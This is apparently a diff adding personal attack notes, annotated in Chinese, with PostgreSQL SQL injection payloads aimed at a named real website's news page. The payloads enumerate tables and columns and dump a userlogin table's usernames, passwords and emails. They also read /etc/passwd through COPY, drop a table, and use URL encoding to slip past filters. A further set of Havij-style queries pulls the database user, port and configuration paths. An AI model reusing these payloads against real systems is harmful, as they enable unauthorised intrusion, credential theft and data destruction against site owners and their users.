@@ -1,0 +1,40 @@
+http://www.kmttp.org.tw/kmt/news/news_im_context.jsp?nid=161210171300
+GET /kmt/news/news_im_context.jsp?nid=161210171300'and 1=2 uNion SelEct null,null,null,null,null,null,null,null,chr(64)||chr(116)||chr(104)||chr(101)||chr(115)||chr(116)||chr(97)||chr(114)||chr(116)||relname||chr(64)||chr(116)||chr(104)||chr(101)||chr(101)||chr(110)||chr(100),null,null from  (select * from (select * from pg_stat_user_tables order by 1 limit 1 )t order by 1 desc limit 1)t-- 
+全部转换成url编码可饶过部分过虑如：将下面的转换
+and 1=2 uNion SelEct null,null,null,null,null,null,null,null,chr(64)||chr(116)||chr(104)||chr(101)||chr(115)||chr(116)||chr(97)||chr(114)||chr(116)||relname||chr(64)||chr(116)||chr(104)||chr(101)||chr(101)||chr(110)||chr(100),null,null from  (select * from (select * from pg_stat_user_tables order by 1 limit 1 )t order by 1 desc limit 1)t-- 
+爆表：
+and 1=2 uNion SelEct '1111','222','333',null,'555','666','777','888',relname,'eee','rrr' from (select * from (select * from pg_stat_user_tables order by 1 limit 1 )t order by 1 desc limit 1)t-- 
+改前面的limit N
+
+爆表的字段：
+and 1=2 uNion SelEct null,null,null,null,null,null,null,null,column_name,null,null from (select column_name from (select column_name from information_schema.columns where table_name=chr(117)||chr(115)||chr(101)||chr(114)||chr(108)||chr(111)||chr(103)||chr(105)||chr(110) order by 1 limit 2)t order by 1 desc limit 1)t--
+
+爆内容：表：userlogin 字段：password,email,uname,userid
+ and 1=2 uNion SelEct null,null,null,null,null,null,null,null,uname||chr(124)||password||chr(124)||email||chr(124)||userid||chr(124)||,null,null from  (select * from (select * from userlogin where 1=1 order by 1 asc  limit 2)t order by 1 desc limit 1)t--
+改前面的limit N
+读取文件：
+;create table _file1(line text);copy _file1 from '/etc/passwd';alter table _file1 add id serial--  建表，复制文件内容到表，改表加一个字段id
+类型;自动增长。
+读内容：
+ and 1=2 uNion SelEct null,null,null,null,null,null,null,null,chr(64)||chr(116)||chr(104)||chr(101)||chr(115)||chr(116)||chr(97)||chr(114)||chr(116)||line||chr(64)||chr(116)||chr(104)||chr(101)||chr(101)||chr(110)||chr(100),null,null from  (select id,line from (select id,line from _file1   limit 0)t order by 1 desc limit 1)t where 1=1--
+
+删表：
+http://www.kmttp.org.tw/kmt/news/news_im_context.jsp?nid=161210171300' ;drop table pg5yl8_shell--
+
+
+havij1.5:
+数据库用户：
+/kmt/news/news_im_context.jsp?nid=999999.9%27+union+all+select+null%2Cnull%2Cnull%2Cnull%2Cchr%28126%29%7C%7Cchr%2839%29%7C%7C%28user%29%7C%7Cchr%2839%29%7C%7Cchr%28126%29%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull+where+%27x%27%3D%27x 
+无资源注入：99999999.9999 
+%2c=,
+端口：
+/kmt/news/news_im_context.jsp?nid=999999.9%27+union+all+select+null%2Cnull%2Cnull%2Cnull%2Cchr%28126%29%7C%7Cchr%2839%29%7C%7C%28current_setting%28%27port%27%29%29%7C%7Cchr%2839%29%7C%7Cchr%28126%29%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull+where+%27x%27%3D%27x
+//select current_setting('port')
+http://www.kmttp.org.tw/kmt/news/news_im_context.jsp?nid=161210171300' and 1=2 uNion sELect '1111','222','333',null,'555','666','777','888',current_setting('port'),'000','rrr'--
+
+配置文件：
+current_setting('config_file')  [/var/lib/pgsql/data/postgresql.conf]
+数据库路径：current_setting('data_directory') 【/var/lib/pgsql/data】
+
+
+
